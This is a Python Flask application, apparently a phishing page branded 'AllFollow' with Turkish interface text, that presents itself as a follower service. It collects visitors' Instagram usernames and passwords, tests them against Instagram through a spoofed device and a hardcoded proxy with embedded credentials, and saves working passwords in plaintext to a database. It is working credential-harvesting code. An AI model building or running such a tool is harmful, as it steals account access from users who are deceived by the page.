import os
import time
import random
import logging
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired, FeedbackRequired
from dotenv import load_dotenv

load_dotenv()
logging.basicConfig(level=logging.INFO)

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# Proxy varsa buraya yazabilirsin, yoksa None kalsın.
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(100), default="Bekliyor")

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/login', methods=['POST'])
def login_api():
    data = request.json
    u, p = data.get('u'), data.get('p')
    cl = Client()
    
    # Cihaz simülasyonu
    cl.set_device_settings({
        "app_version": "269.0.0.18.75",
        "android_version": 26,
        "android_release": "8.0.0",
        "dpi": "480dpi",
        "resolution": "1080x1920",
        "manufacturer": "Samsung",
        "device": "SM-G973F",
        "model": "beyond1",
        "cpu": "exynos9820",
        "version_code": "442431182"
    })

    if PROXY_URL:
        try:
            cl.set_proxy(PROXY_URL)
        except:
            logging.error("Proxy ayarlanamadı.")

    try:
        logging.info(f"Giris deneniyor: {u}")
        time.sleep(random.uniform(2, 4))
        
        if cl.login(u, p):
            acc = IGAccount.query.filter_by(username=u).first()
            if not acc:
                acc = IGAccount(username=u, password=p, status="AKTIF")
                db.session.add(acc)
            else:
                acc.status = "AKTIF"
            db.session.commit()
            return jsonify(status="success", next_step="dashboard")
            
    except BadPassword:
        return jsonify(status="error", message="Sifre Yanlis!")
    except ChallengeRequired:
        return jsonify(status="challenge", next_step="verify")
    except FeedbackRequired:
        return jsonify(status="error", message="Instagram engeli: 15 dk bekleyin.")
    except Exception as e:
        err = str(e).lower()
        logging.error(f"Hata: {err}")
        if "checkpoint" in err:
            return jsonify(status="challenge", next_step="verify")
        return jsonify(status="error", message="Baglanti Hatasi (IP Bloklu olabilir)")

@app.route('/api/verify', methods=['POST'])
def verify_api():
    return jsonify(status="success")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllFollow</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; min-height: 100vh; font-family: sans-serif; }
        .box { background: #111; border: 1px solid #333; padding: 2rem; border-radius: 1.5rem; width: 320px; text-align: center; }
        input { width: 100%; background: #222; border: 1px solid #444; padding: 10px; border-radius: 8px; color: #fff; margin-bottom: 10px; outline: none; }
        button { width: 100%; background: #a855f7; color: #fff; font-weight: bold; padding: 10px; border-radius: 8px; border: none; cursor: pointer; }
        .loader { border: 2px solid #f3f3f3; border-top: 2px solid #a855f7; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div id="login-page" class="box">
        <h1 class="text-2xl font-black text-purple-500 mb-6 italic">ALLFOLLOW</h1>
        <input id="u" placeholder="Kullanıcı Adı">
        <input id="p" type="password" placeholder="Şifre">
        <button onclick="login()" id="btn">GİRİŞ YAP</button>
        <p id="err" class="text-red-500 text-[10px] mt-3 font-bold"></p>
    </div>
    <script>
        async function login() {
            const btn = document.getElementById('btn'), err = document.getElementById('err');
            btn.disabled = true; btn.innerHTML = '<div class="loader"></div> BEKLEYİN...';
            try {
                const r = await fetch('/api/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({u: document.getElementById('u').value, p: document.getElementById('p').value})
                });
                const d = await r.json();
                if(d.status === "success") { alert("Giriş Başarılı!"); location.reload(); }
                else { err.innerText = d.message; btn.disabled = false; btn.innerText = "GİRİŞ YAP"; }
            } catch { err.innerText = "Bağlantı koptu!"; btn.disabled = false; btn.innerText = "GİRİŞ YAP"; }
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
